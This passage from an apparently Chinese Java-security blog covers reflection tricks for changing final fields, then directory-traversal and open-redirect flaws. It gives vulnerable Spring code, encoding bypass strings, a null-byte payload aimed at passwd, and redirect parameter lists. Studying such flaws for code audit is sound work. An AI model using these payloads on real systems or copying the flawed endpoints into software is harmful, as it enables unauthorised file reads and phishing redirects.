常量——它们在编译期或类加载后就被当作不可变常量处理了。</p><p>在 JDK 8（你用的是 1.8.0_112）里，有几个关键点导致你看不到修改效果：</p><ol><li><strong>JIT 常量折叠（constant folding）</strong><ul><li><code>final</code> 基本类型字段一旦被初始化，JVM 在运行时会直接把它当常量用，调用时直接从寄存器&#x2F;常量池取，而不是重新读字段值。</li><li>所以即便你反射 set 成新值，后面的调用仍然用的是缓存的旧值。</li></ul></li><li><strong>缓存的 Field 值</strong><ul><li>某些情况下，JVM 会在第一次访问后把 final 字段的值缓存起来，后续不会再真正访问内存。</li></ul></li><li><strong>你的 <code>printInfo()</code> 可能直接使用了编译期内联值</strong><ul><li>如果 <code>printInfo()</code> 方法在同一个类里直接访问了 <code>final int age</code>，编译器在生成字节码时已经把值“写死”了。</li></ul></li></ol><h4 id="间接赋值"><a href="#间接赋值" class="headerlink" title="间接赋值"></a>间接赋值</h4><p><strong>InDirectPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;male&quot;</span>);  <br>    <span class="hljs-comment">// 经过逻辑判断产生的变量赋值  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> (<span class="hljs-literal">null</span>!=<span class="hljs-literal">null</span>?<span class="hljs-number">18</span>:<span class="hljs-number">18</span>);  <br>    <span class="hljs-comment">// 通过构造函数进行赋值  </span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InDirectPerson</span><span class="hljs-params">()</span>&#123;  <br>        name = <span class="hljs-string">&quot;1&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age+<span class="hljs-string">&quot; &quot;</span>+sex);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>InDirectReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.InDirectPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        printMethod.invoke(m);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">sexField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;sex&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        ageField.setAccessible(<span class="hljs-literal">true</span>);<br>        sexField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);<br>        ageField.set(m,<span class="hljs-number">180</span>);<br>        sexField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;female&quot;</span>));<br>        printMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功修改</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a06.png"></p><h3 id="static-final"><a href="#static-final" class="headerlink" title="static + final"></a>static + final</h3><p>使用 static final 修饰符的 name 属性，并且是间接赋值，直接通过反射修改是不可以的。</p><p>如果 <code>final</code> 字段是 <strong>编译期常量</strong>（<code>static final</code> 并且是基本类型或 String 且值已知），编译器会直接把值<strong>内联</strong>到使用它的地方。<br> 即使你用反射改了字段值，原来引用它的地方读的仍然是编译期替换进去的值。</p><p>这里我们需要通过反射, 把 nameField 的 final 修饰符去掉，再赋值。</p><p><strong>StaticFinalPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalPerson</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticFinalReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ReflectDemo.ReflectFixFinal.pojo.StaticFinalPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameModifyField</span> <span class="hljs-operator">=</span> nameField.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);  <br>        nameModifyField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;2&quot;</span>));  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a07.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的其他漏洞</title>
    <link href="/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="java代码审计中的其他漏洞"><a href="#java代码审计中的其他漏洞" class="headerlink" title="java代码审计中的其他漏洞"></a>java代码审计中的其他漏洞</h1><h2 id="目录穿越漏洞-任意文件下载-读取"><a href="#目录穿越漏洞-任意文件下载-读取" class="headerlink" title="目录穿越漏洞(任意文件下载&#x2F;读取)"></a>目录穿越漏洞(任意文件下载&#x2F;读取)</h2><p>出自：<a href="https://www.cnblogs.com/chm0d/p/17664249.html">Java代码审计之目录穿越(任意文件下载&#x2F;读取) - chm0d的安全避风港 - 博客园</a></p><p>此漏洞一般配合文件操作进行使用</p><h3 id="什么是目录穿越"><a href="#什么是目录穿越" class="headerlink" title="什么是目录穿越"></a>什么是目录穿越</h3><p>　　所谓的目录穿越指利用操作系统中的文件系统对目录的表示。在文件系统路径中，”..”表示上一级目录，当你使用”..&#x2F;“时，你正在引用当前目录的上一级目录。如果你使用”..&#x2F;..&#x2F;“，你实际上在两次”..”的基础上，再次引用上一级目录，从而返回到上两级目录。</p><p>　　例子：假设你目前所在目录为：C:\Windows\System32\drivers\etc</p><ul><li>使用”..&#x2F;“ 一次返回上一级目录，即：C:\Windows\System32\drivers</li><li>使用”..&#x2F;..&#x2F;“ 一次返回上一级目录，即：C:\Windows\System32</li></ul><p>　　这是因为在文件系统路径中，每个”..”都表示回到上一级目录。所以多个连续的”..”会连续返回到更高级别的目录。然而在漏洞利用中Windows和Linux系统会有区别，后续漏洞利用中会提到。</p><h3 id="目录穿越漏洞成因"><a href="#目录穿越漏洞成因" class="headerlink" title="目录穿越漏洞成因"></a>目录穿越漏洞成因</h3><p>　　目录穿越漏洞，也叫做目录遍历&#x2F;路径遍历漏洞。常发生于文件上传，文件下载，文件下载等处。由于后端直接接收前端传过来的文件名或路径，没有对其进行检测与过滤，导致攻击者利用..&#x2F;的方式进行目录穿越，达到任意文件读取&#x2F;下载，任意文件删除，或将任意文件上传到指定目录等。</p><h3 id="目录穿越漏洞的利用"><a href="#目录穿越漏洞的利用" class="headerlink" title="目录穿越漏洞的利用"></a>目录穿越漏洞的利用</h3><p>　　Windows中目录穿越漏洞由于操作系统可能导致只能在设定好的盘符下进行穿越，不能越过其他盘符读取，如：读取日志文件，后端代码F:&#x2F;wwwroot&#x2F;logs + “前端传递的文件名”。此时通过..&#x2F;进行目录穿越只能在F盘下进行读取，不能读取F盘以外的任何文件，如：C:\windows\win.ini。而Linux中却不受到这种限制，只要有足够的权限可以读任意目录下的文件。</p><p>　　一般目录穿越导致的主要为任意文件读取，一般都是读取配置文件，因为配置文件中保存着大量敏感信息，如：各种数据库连接地址与账号密码</p><h3 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//    任意文件读取/下载</span><br>    <span class="hljs-meta">@ApiOperation(value = &quot;任意文件读取/下载&quot;)</span><br>    <span class="hljs-meta">@GetMapping(&quot;readBuffer&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">readbuffer</span><span class="hljs-params">(String filename,HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(Files.newInputStream(Paths.get(filename))))&#123;<br>            response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span> + filename);<br>            response.setContentLength((<span class="hljs-type">int</span>) Files.size(Paths.get(filename)));<br>            response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br><br>            <span class="hljs-comment">// 使用 Apache Commons IO 库的工具方法将输入流中的数据拷贝到输出流中</span><br>            IOUtils.copy(inputStream, response.getOutputStream());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件下载成功：&quot;</span> + filename;<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件下载失败：&quot;</span> + filename;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>此处就是对filename参数没有任何过滤，导致攻击者使用..&#x2F;可实现任意文件下载</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>单次url编码，..&#x2F;编码后..%2f，%2e%2e%2f。</p><h4 id="双-多重url编码"><a href="#双-多重url编码" class="headerlink" title="双&#x2F;多重url编码"></a>双&#x2F;多重url编码</h4><p>进行双重url编码，多了个25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %252e<br>/ = %252f<br>\ = %255c<br></code></pre></td></tr></table></figure><h4 id="Unicode的URL编码"><a href="#Unicode的URL编码" class="headerlink" title="Unicode的URL编码"></a>Unicode的URL编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %u002e<br>/ = %u2215<br>\ = %u2216<br></code></pre></td></tr></table></figure><h4 id="UTF-8的Unicode编码"><a href="#UTF-8的Unicode编码" class="headerlink" title="UTF-8的Unicode编码"></a>UTF-8的Unicode编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %c0%2e, %e0%40%ae, %c0ae<br>/ = %c0%af, %e0%80%af, %c0%2f<br>\ = %c0%5c, %c0%80%5c<br></code></pre></td></tr></table></figure><h4 id="超长UTF-8编码"><a href="#超长UTF-8编码" class="headerlink" title="超长UTF-8编码"></a>超长UTF-8编码</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">. <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>e<span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%40</span><span class="hljs-variable">%ae</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0ae</span><br>/ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>f<br>\ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h4 id="空字节截断"><a href="#空字节截断" class="headerlink" title="空字节截断"></a>空字节截断</h4><p>也就是大家熟知的00截断，用于判断后缀名，使用空字节URL编码绕过（出现几率非常小）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../passwd%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>通过前面原理介绍，目录穿越是由于文件系统的特性所导致的，通过..&#x2F;进行目录的跨越。修复只需要检测字符”..”与”&#x2F;“即可，在对应语言中加入检测即可，以java为例：写一个工具类检测即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Security</span> &#123;<br><br><span class="hljs-comment">//    目录穿越检验</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkTraversal</span><span class="hljs-params">(String content)</span>&#123;<br>        <span class="hljs-keyword">return</span> content.contains(<span class="hljs-string">&quot;..&quot;</span>) || content.contains(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="url重定向"><a href="#url重定向" class="headerlink" title="url重定向"></a>url重定向</h2><p>参考：《网络安全Java代码审计实战》</p><p>​<a href="https://xz.aliyun.com/news/14506">记URL重定向漏洞骚技巧-先知社区</a></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>也称URL跳转、URL重定向漏洞，由于目标网站未对程序跳转的URL地址及参数做合法性判断，导致应用程序直接跳转到参数中指定的的URL地址。攻击者可通过将跳转地址修改为指向恶意站点，即可发起网络钓鱼、诈骗甚至窃取用户凭证等。</p><h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h3><h4 id="1-通过-ModelAndView-方式"><a href="#1-通过-ModelAndView-方式" class="headerlink" title="1.通过 ModelAndView 方式"></a>1.通过 ModelAndView 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">testforward</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span>req.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;redirect: &quot;</span>+url; <br> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h4 id="2-通过返回-String-方式"><a href="#2-通过返回-String-方式" class="headerlink" title="2.通过返回 String 方式"></a>2.通过返回 String 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <br> &#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h4 id="3-使用-sendRedirect-方式"><a href="#3-使用-sendRedirect-方式" class="headerlink" title="3.使用 sendRedirect 方式"></a>3.使用 sendRedirect 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> <br>IOException&#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> response.sendRedirect(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a>  </p><h4 id="4-使用-RedirectAttributes-方式"><a href="#4-使用-RedirectAttributes-方式" class="headerlink" title="4.使用 RedirectAttributes 方式"></a>4.使用 RedirectAttributes 方式</h4><p>对于一般的 URL 跳转，使用 redirect 即可满足要求。如果需要进行参数拼接，则一 般使用 RedirectAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/RedirectAttributes&quot;)</span> <br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">test4</span><span class="hljs-params">(RedirectAttributes redirectAttributes)</span> &#123; <br> redirectAttributes.addAttribute(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>); <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/test/index&quot;</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/RedirectAttributes%E3%80%82">http://www.any.com/RedirectAttributes。</a>  “ @RequestMapping(“&#x2F;RedirectAttributes”) ” 在 方 法 前 面 要 说 明 URL 访 问 是 通 过 <a href="http://192.168.88.2:8080/RedirectAttributes">http://192.168.88.2:8080/RedirectAttributes</a> 来访问的，代码中“return “redirect:&#x2F;test&#x2F;index”;”， 就 会 重 定 向 到 <a href="http://192.168.88.2:8080/test/index">http://192.168.88.2:8080/test/index</a> 这 个 URL ， 通 过 “ redirectAttributes.  addAttribute(“id”,”2”)”传递了 id&#x3D;2 这个参数，所以最终访问的其实是 <a href="http://192.168.88.2/">http://192.168.88.2</a>:  8080&#x2F;test&#x2F;index?id&#x3D;2 这个 URL 地址。</p><p><img src="/img/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/q01.png"></p><h4 id="5-通过设置Header来进行跳转"><a href="#5-通过设置Header来进行跳转" class="headerlink" title="5.通过设置Header来进行跳转"></a>5.通过设置Header来进行跳转</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;     <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);     response.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY);       response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url); &#125; <br></code></pre></td></tr></table></figure><p>通过“response.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY)”设置返回的状态码，“SC_MOVED_PERMANENTLY”是301 永久重定向，“SC_MOVED_ TEMPORARILY”是302 临时重定向。 </p><p>URL跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>主要是业务逻辑中需要进行跳转的地方。比如登录处、注册处、访问用户信息、订单信息、加入购物车、分享、收藏等处。</p><ol><li>登陆跳转是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</li><li>用户分享、收藏内容过后，会跳转</li><li>跨站点认证、授权后，会跳转</li><li>站内点击其它网址链接时，会跳转</li><li>在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</li><li>业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="url跳转常用参数"><a href="#url跳转常用参数" class="headerlink" title="url跳转常用参数"></a>url跳转常用参数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect<br>url<br>redirectUrl<br>callback<br>return_url<br>toUrl<br>ReturnUrl<br>fromUrl<br>redUrl<br>request<br>redirect_to<br>redirect_url<br>jump<br>jump_to<br>target<br>to<br><span class="hljs-keyword">goto</span><br>link<br>linkto<br>domain<br>oauth_callback<br></code></pre></td></tr></table></figure><h4 id="实现url跳转需要的方法"><a href="#实现url跳转需要的方法" class="headerlink" title="实现url跳转需要的方法"></a>实现url跳转需要的方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect <br>sendRedirect<br>ModelAndView<br>Location<br>addAttribute … <br></code></pre></td></tr></table></figure><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li><p>攻击者可能会使用Web服务器攻击其他站点；</p></li><li><p>如果对输出没有做严格限制，将可能导致反射性XSS漏洞；</p></li><li><p>黑产将利用此漏洞，从信任网站跳转到攻击者构造的恶意网站用来进行钓鱼、诈骗等行为；</p></li><li><p>结合csrf漏洞，攻击者可通过url重定向获取cookie</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRF漏洞原理攻击与防御（非常细）-CSDN博客</a></p></li></ol><h3 id="实战案例-黑盒"><a href="#实战案例-黑盒" class="headerlink" title="实战案例(黑盒)"></a>实战案例(黑盒)</h3><p>出自：(<a href="https://xz.aliyun.com/news/14506">https://xz.aliyun.com/news/14506</a>)</p><p>该漏洞场景是对一个视频分享它会生成一个二维码跳转到我们要分享的视频，可我们可以在生成二维码的时候进行抓包导致ur跳转漏洞。</p><ol><li>首先我这里给分享视频地址生成的二维码</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133335-46e35650-44c7-1.png"></p><p>这个分享二维码的url如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 